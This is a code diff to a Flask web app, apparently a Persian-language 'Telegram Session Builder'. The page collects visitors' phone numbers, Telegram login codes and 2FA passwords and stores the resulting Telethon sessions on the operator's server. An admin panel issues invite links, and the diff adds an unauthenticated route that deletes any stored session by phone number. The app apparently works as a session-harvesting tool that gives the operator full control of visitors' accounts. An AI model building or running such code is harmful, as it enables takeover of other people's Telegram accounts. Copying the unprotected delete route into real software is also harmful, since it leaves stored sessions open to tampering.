@@ -10,6 +10,7 @@ from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
 from pymongo import MongoClient
 from datetime import datetime
 import requests
+import shutil
 
 # ===================== CONFIG ===================================
 
@@ -77,6 +78,14 @@ def normalize_phone(phone):
         return "+98" + phone
     return phone
 
+def delete_session(phone):
+    # پاک کردن فایل سشن
+    path = os.path.join(self_config["save_path"], phone)
+    if os.path.exists(path):
+        shutil.rmtree(path)
+    # پاک کردن دیتابیس
+    sessions_col.delete_one({"phone": phone})
+
 # ===================== HTML (USER) ===============================
 
 HTML_PAGE = """
@@ -86,40 +95,33 @@ HTML_PAGE = """
 <meta charset="UTF-8">
 <title>Telegram Session Builder</title>
 <style>
-body {
-    background: url('static/images/astronomy-1867616_1280.jpg') no-repeat center center fixed;
-    background-size: cover;
-    color: white;
-    font-family: tahoma;
-}
-.box {
-    width: 360px;
-    margin: 120px auto;
-    padding: 25px;
-    background: #0f172a;
-    border-radius: 16px;
-    text-align: center;
-}
-input, button {
-    width: 95%;
-    padding: 12px;
-    margin-top: 10px;
-    border-radius: 10px;
-    border: none;
-}
-button {
-    background: #6366f1;
-    color: white;
-}
+body { background:#0f172a;color:white;font-family:tahoma; }
+.box { width:360px;margin:120px auto;padding:25px;background:#0f172a;border-radius:16px;text-align:center; }
+input, button, select { width:95%; padding:12px;margin-top:10px;border-radius:10px;border:none; }
+button { background:#6366f1;color:white; }
 </style>
 </head>
 <body>
 <div class="box">
 <h3>ساخت سشن تلگرام</h3>
 
+<div id="s0" style="display:block">
+<select id="country" onchange="updateCode()">
+<option value="+98">ایران 🇮🇷</option>
+<option value="+90">ترکیه 🇹🇷</option>
+<option value="+1">آمریکا 🇺🇸</option>
+<option value="+44">انگلیس 🇬🇧</option>
+</select>
+</div>
+
 <div id="s1">
 <input id="phone" placeholder="شماره تلفن">
-<button onclick="sendPhone()">ارسال کد</button>
+<button onclick="checkPhone()">ادامه</button>
+</div>
+
+<div id="exists" style="display:none">
+<p>شما قبلاً ثبت نام کرده‌اید</p>
+<button onclick="deleteSession()">حذف سشن قبلی</button>
 </div>
 
 <div id="s2" style="display:none">
@@ -140,41 +142,54 @@ button {
 <script>
 let phone="";
 
-function fix(n){
- n=n.trim();
- if(n.startsWith("0")) return "+98"+n.slice(1);
- if(n.startsWith("9") && n.length==10) return "+98"+n;
- return n;
+function updateCode(){
+    let select = document.getElementById("country");
+    let p = document.getElementById("phone");
+    if(!p.value.startsWith("+")){
+        p.value = select.value;
+    }
+}
+
+function checkPhone(){
+    phone = document.getElementById("phone").value;
+    fetch("/check_phone",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone})})
+    .then(r=>r.json()).then(d=>{
+        if(d.status=="exists"){document.getElementById("exists").style.display="block"; s1.style.display="none";}
+        if(d.status=="ok"){sendPhone();}
+    });
+}
+
+function deleteSession(){
+    fetch("/delete_session",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone})})
+    .then(r=>r.json()).then(d=>{
+        if(d.status=="ok"){alert("سشن قبلی حذف شد"); document.getElementById("exists").style.display="none"; s1.style.display="block";}
+    });
 }
 
 function sendPhone(){
- phone = fix(document.getElementById("phone").value);
- fetch("/send_phone",{method:"POST",headers:{"Content-Type":"application/json"},
- body:JSON.stringify({phone})})
- .then(r=>r.json()).then(d=>{
-   alert(d.message);
-   if(d.status=="ok"){s1.style.display="none";s2.style.display="block";}
- });
+    fetch("/send_phone",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone})})
+    .then(r=>r.json()).then(d=>{
+        alert(d.message);
+        if(d.status=="ok"){s1.style.display="none";s2.style.display="block";}
+    });
 }
 
 function sendCode(){
- fetch("/send_code",{method:"POST",headers:{"Content-Type":"application/json"},
- body:JSON.stringify({phone,code:code.value})})
- .then(r=>r.json()).then(d=>{
-   if(d.status=="2fa"){s2.style.display="none";s3.style.display="block";}
-   if(d.status=="ok"){finish();}
- });
+    fetch("/send_code",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone,code:code.value})})
+    .then(r=>r.json()).then(d=>{
+        if(d.status=="2fa"){s2.style.display="none";s3.style.display="block";}
+        if(d.status=="ok"){finish();}
+    });
 }
 
 function sendPassword(){
- fetch("/send_password",{method:"POST",headers:{"Content-Type":"application/json"},
- body:JSON.stringify({phone,password:password.value})})
- .then(r=>r.json()).then(d=>{if(d.status=="ok")finish();});
+    fetch("/send_password",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone,password:password.value})})
+    .then(r=>r.json()).then(d=>{if(d.status=="ok")finish();});
 }
 
 function finish(){
- s1.style.display=s2.style.display=s3.style.display="none";
- done.style.display="block";
+    s1.style.display=s2.style.display=s3.style.display="none";
+    done.style.display="block";
 }
 
 setInterval(()=>fetch("/ping"),240000);
@@ -196,71 +211,20 @@ def home():
 def ping():
     return "OK"
 
-# ===================== Admin Panel ===============================
+# ===================== Phone Check ==============================
 
-ADMIN_HTML = """
-<!DOCTYPE html>
-<html lang="fa">
-<head>
-<meta charset="UTF-8">
-<title>Admin Panel</title>
-<style>
-body{background:#020617;color:white;font-family:tahoma}
-button{padding:6px 14px;border-radius:6px}
-</style>
-</head>
-<body>
+@app.route("/check_phone", methods=["POST"])
+def check_phone():
+    phone = normalize_phone(request.json["phone"])
+    if sessions_col.find_one({"phone": phone}):
+        return jsonify(status="exists")
+    return jsonify(status="ok")
 
-<h2>پنل ادمین</h2>
-
-<form method="post">
-<input name="max" type="number" placeholder="تعداد استفاده" required>
-<button>ساخت لینک</button>
-</form>
-
-<hr>
-
-{% for l in links %}
-<div>
-{{ l.token }} | {{ l.used }}/{{ l.max }}
-<button onclick="copy('{{ l.token }}')">📋 کپی</button>
-</div>
-{% endfor %}
-
-<script>
-function copy(t){
- navigator.clipboard.writeText("{{ base_url }}/?key="+t);
- alert("کپی شد");
-}
-</script>
-
-</body>
-</html>
-"""
-
-@app.route("/admin", methods=["GET","POST"])
-def admin():
-    auth = request.authorization
-    if not auth or auth.username!=self_config["admin_username"] or auth.password!=self_config["admin_password"]:
-        return ("Unauthorized",401,{"WWW-Authenticate":"Basic"})
-    if request.method=="POST":
-        links_col.insert_one({
-            "token": gen_token(),
-            "max": int(request.form["max"]),
-            "used": 0,
-            "created": datetime.utcnow()
-        })
-        return redirect("/admin")
-    return render_template_string(
-        ADMIN_HTML,
-        links=list(links_col.find()),
-        base_url=self_config["base_url"]
-    )
-
-@app.route("/admin/delete/<token>")
-def delete(token):
-    links_col.delete_one({"token": token})
-    return redirect("/admin")
+@app.route("/delete_session", methods=["POST"])
+def delete_session_route():
+    phone = normalize_phone(request.json["phone"])
+    delete_session(phone)
+    return jsonify(status="ok")
 
 # ===================== Telethon ================================
 
@@ -317,25 +281,62 @@ def send_password():
     run_async(job())
     return jsonify(status="ok")
 
-# ===================== KEEP ALIVE (HARD MODE) ====================
+# ===================== Admin Panel ===============================
+
+ADMIN_HTML = """
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+<meta charset="UTF-8">
+<title>Admin Panel</title>
+<style>body{background:#020617;color:white;font-family:tahoma} button{padding:6px 14px;border-radius:6px}</style>
+</head>
+<body>
+<h2>پنل ادمین</h2>
+<form method="post">
+<input name="max" type="number" placeholder="تعداد استفاده" required>
+<button>ساخت لینک</button>
+</form>
+<hr>
+{% for l in links %}
+<div>{{ l.token }} | {{ l.used }}/{{ l.max }}</div>
+{% endfor %}
+</body>
+</html>
+"""
+
+@app.route("/admin", methods=["GET","POST"])
+def admin():
+    auth = request.authorization
+    if not auth or auth.username!=self_config["admin_username"] or auth.password!=self_config["admin_password"]:
+        return ("Unauthorized",401,{"WWW-Authenticate":"Basic"})
+    if request.method=="POST":
+        links_col.insert_one({
+            "token": gen_token(),
+            "max": int(request.form["max"]),
+            "used": 0,
+            "created": datetime.utcnow()
+        })
+        return redirect("/admin")
+    return render_template_string(
+        ADMIN_HTML,
+        links=list(links_col.find()),
+        base_url=self_config["base_url"]
+    )
+
+# ===================== KEEP ALIVE ================================
 
 def internal_ping():
     while True:
-        try:
-            requests.get(self_config["base_url"] + "/ping", timeout=10)
-        except:
-            pass
+        try: requests.get(self_config["base_url"] + "/ping", timeout=10)
+        except: pass
         time.sleep(230)
 
 def fake_bot_ping():
     while True:
         try:
-            requests.get(
-                f"https://api.telegram.org/bot{self_config['fake_bot_token']}/getMe",
-                timeout=10
-            )
-        except:
-            pass
+            requests.get(f"https://api.telegram.org/bot{self_config['fake_bot_token']}/getMe",timeout=10)
+        except: pass
         time.sleep(240)
 
 threading.Thread(target=internal_ping, daemon=True).start()
